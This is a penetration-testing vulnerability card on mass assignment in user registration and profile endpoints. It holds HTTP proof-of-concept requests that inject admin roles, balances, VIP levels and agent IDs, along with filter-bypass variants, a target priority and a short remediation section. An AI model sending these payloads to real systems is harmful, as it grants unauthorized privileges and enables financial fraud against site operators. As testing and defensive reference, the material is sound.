---
title: Mass Assignment (inject role / vip / balance / agentId through registration/profile endpoints)
cve: None (business logic)
severity: high
cvss: 8.8
product: Custom user/agent endpoints
versions: Any
ports: 80, 443
keywords: mass assignment, mass assignment, role, vip, balance, agentId
entry: Add role=admin to the registration body
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

- Registration/profile-update responses closely overlap request fields: `role`, `vipLevel`, `balance`, `agentId`, `status`, `isAdmin`.
- Frontend forms submit only some fields (suggesting the backend may bind the entire object).

## Prerequisites

- Ability to register an account and capture traffic.

## PoC

```http
### 1) Add extra fields during registration
POST /api/user/register HTTP/1.1
Content-Type: application/json

{"phone":"13900000003","password":"Passw0rd!","code":"1234","role":"admin","vipLevel":9,"balance":100000,"agentId":1}

### 2) Change privileges through profile updates
POST /api/user/update HTTP/1.1
Authorization: Bearer <token>

{"nickname":"x","role":"admin","isAgent":true,"commissionRate":"0.9"}

### 3) Approval state on the agent-application endpoint
POST /api/agent/apply HTTP/1.1

{"uid":<yourself>,"status":1,"agentLevel":"master agent"}
```

## Exploitation Steps

1. Send one "extra fields" request each for registration/update, then read `/api/user/info` to see whether the fields were accepted.
2. Priority: `role`/`isAdmin` > `agentId`/`isAgent` > `balance`/`vipLevel` (the first two concern permissions, the last two money).
3. If filtered, try case/camelCase/nesting variants: `Role`, `is_admin`, `{"user":{"role":"admin"}}`, `role[]=admin`.
4. After success, check for backend access (`/api/admin/**`) or commission-rate changes (combine with `agent-hierarchy-privilege.md`).
5. Evidence: one request + a read-back from `/api/user/info`; do not actually withdraw.

## Remediation and Mitigation

- Allowlist binding (DTOs list only permitted fields); always assign `role`/`balance`/`agentId` server-side.
- Enforce field-level authorization on updates (non-admins cannot change role).
- Audit registration/profile changes.

## References

- OWASP Mass Assignment Cheat Sheet；CWE-915。
